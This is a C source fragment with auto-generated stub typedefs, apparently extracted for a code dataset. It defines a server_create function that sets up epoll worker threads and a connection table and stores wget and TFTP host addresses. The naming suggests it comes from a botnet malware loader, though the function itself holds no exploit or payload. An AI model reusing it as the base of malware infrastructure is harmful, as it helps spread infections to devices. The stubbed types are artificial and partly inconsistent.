
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int uint8_t ;
typedef int uint32_t ;
struct server_worker {int bind_addrs_len; int max_open; char* wget_host_ip; char* tftp_host_ip; int workers_len; int thread_id; int efd; int to_thrd; int thread; struct server_worker* workers; struct server_worker* srv; TYPE_1__** estab_conns; int wget_host_port; int * bind_addrs; } ;
struct server {int bind_addrs_len; int max_open; char* wget_host_ip; char* tftp_host_ip; int workers_len; int thread_id; int efd; int to_thrd; int thread; struct server* workers; struct server* srv; TYPE_1__** estab_conns; int wget_host_port; int * bind_addrs; } ;
struct connection {int dummy; } ;
typedef int port_t ;
typedef int ipv4_t ;
struct TYPE_2__ {int lock; } ;


 void* calloc (int,int) ;
 int epoll_create1 (int ) ;
 int errno ;
 int exit (int) ;
 int free (struct server_worker*) ;
 int printf (char*,...) ;
 int pthread_create (int *,int *,int ,struct server_worker*) ;
 int pthread_mutex_init (int *,int *) ;
 int timeout_thread ;
 int worker ;

struct server *server_create(uint8_t threads, uint8_t addr_len, ipv4_t *addrs, uint32_t max_open, char *wghip, port_t wghp, char *thip)
{
    struct server *srv = calloc(1, sizeof (struct server));
    struct server_worker *workers = calloc(threads, sizeof (struct server_worker));
    int i;


    srv->bind_addrs_len = addr_len;
    srv->bind_addrs = addrs;
    srv->max_open = max_open;
    srv->wget_host_ip = wghip;
    srv->wget_host_port = wghp;
    srv->tftp_host_ip = thip;
    srv->estab_conns = calloc(max_open * 2, sizeof (struct connection *));
    srv->workers = calloc(threads, sizeof (struct server_worker));
    srv->workers_len = threads;

    if (srv->estab_conns == ((void*)0))
    {
        printf("Failed to allocate establisted_connections array\n");
        exit(0);
    }


    for (i = 0; i < max_open * 2; i++)
    {
        srv->estab_conns[i] = calloc(1, sizeof (struct connection));
        if (srv->estab_conns[i] == ((void*)0))
        {
            printf("Failed to allocate connection %d\n", i);
            exit(-1);
        }
        pthread_mutex_init(&(srv->estab_conns[i]->lock), ((void*)0));
    }


    for (i = 0; i < threads; i++)
    {
        struct server_worker *wrker = &srv->workers[i];

        wrker->srv = srv;
        wrker->thread_id = i;

        if ((wrker->efd = epoll_create1(0)) == -1)
        {
            printf("Failed to initialize epoll context. Error code %d\n", errno);
            free(srv->workers);
            free(srv);
            return ((void*)0);
        }

        pthread_create(&wrker->thread, ((void*)0), worker, wrker);
    }

    pthread_create(&srv->to_thrd, ((void*)0), timeout_thread, srv);

    return srv;
}
